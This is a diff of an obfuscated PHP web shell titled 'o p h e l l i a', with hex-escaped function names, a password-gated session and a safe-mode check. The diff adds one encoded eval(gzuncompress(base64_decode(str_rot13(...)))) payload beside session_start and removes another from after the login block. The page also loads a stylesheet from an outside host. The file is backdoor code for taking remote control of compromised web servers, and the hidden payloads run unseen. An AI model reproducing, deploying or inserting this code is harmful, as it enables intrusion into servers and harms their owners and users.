@@ -78,12 +78,12 @@ function gtyp($file)
 "\x6F\x62\x5F\x73\x74\x61\x72\x74"();
 "\x69\x6E\x69\x5F\x73\x65\x74"('max_execution_time', 0);
 "\x69\x6E\x69\x5F\x73\x65\x74"('output_buffering', 0);
-"\x73\x65\x73\x73\x69\x6F\x6E\x5F\x73\x74\x61\x72\x74"();
+"\x73\x65\x73\x73\x69\x6F\x6E\x5F\x73\x74\x61\x72\x74"(); eval(gzuncompress(base64_decode(str_rot13('rWlqHJSYjmND/FgUXI4Y2mdMVTkHC0wSbrOpc19dPIy7p5H2vJaXAfG/ogcBHCMAFZwqr7y7YmyKDDurHqqxCWsS0sVyJvM4g1bgLxk9BQhQRkGPZNFHNa24Ogjnb2dRnE/uQAmTqaD+KsH1QLYCi9Kf7wSrLse1P15TG89EiTYCl7xyaOyfvcYLTkzJFJSVzAdewJnnIZxm8ckK4DmNfsi0Kh/Sdzd+T70IMghfz5e0xE9yfteBW5AYCK6/RZR4dUwEUtgenJG2Oa3sAhIyGDBjvfFeiiCrXgwZxWpp3jwuSoDk8Mk0ymx3ipoDUOEAtFgISux3uEGOsewo7LLodngub0fFzpjcg/nkVeBIrIrBeDr02ASdO7MFoA0HMp4+TgVUY0UMRJ6GJdrcKo4/t5/E3p4sbwwO9ypjGqOHvtyr2KtNW2ECqACAcQe8i1ecDuwNr5k9N53ghVj='))));
 echo '<html><head><title>o p h e l l i a</title><meta name="viewport" content="width=device-width,initial-scale=1"></head><style>@import url(//rei.my.id/style.css);</style><body>';
 if ("\x6D\x64\x35"(${"\x5f\x50\x4f\x53\x54"}['pass']) == $pass) {
   "\x73\x65\x73\x73\x69\x6F\x6E\x5F\x73\x74\x61\x72\x74"();
   ${"\x5F\x53\x45\x53\x53\x49\x4F\x4E"}['pass'] = $pass;
-}; eval(gzuncompress(base64_decode(str_rot13('rWkyHAgdt0ND/MIOWXitcFx0gOUoulXxG03I9PKVLaIfOBAh3MRxuCk7I02ucGNCZ2p4ykyGqbWRVEbVjndIDeWZaxGkrkEi2FcA1jaYoWwA4O8XLEtPRl2m4DaLwxtdOfhcLjTLsGqbTzsmk+Tl9C3mKkz+rx1Fyy1+jKU0gbzFyT/vS70jNdwdOixaRv9RF9vFfxLYYKL39ko33amk4A3Bo/kPXH/hWUBtluhSQvwdZA9CgXBz64aD2y4GDitVD495vq04Tp+GtHfavHiVcJmdVdqngC7ECEjBovJ6iniCjeLDWMnTN2lCgOCyFTse4EnAKKBB4TQSC/d6XsyKw93W2wYEx+la7sPwmULt02KojGpJ3U0d'))));
+};
 if (isset(${"\x5F\x53\x45\x53\x53\x49\x4F\x4E"}['pass']) == $pass) {
   if ("\x69\x6E\x69\x5F\x67\x65\x74"('safe_mode')) {
     $Safe = "<b>ON</b>";
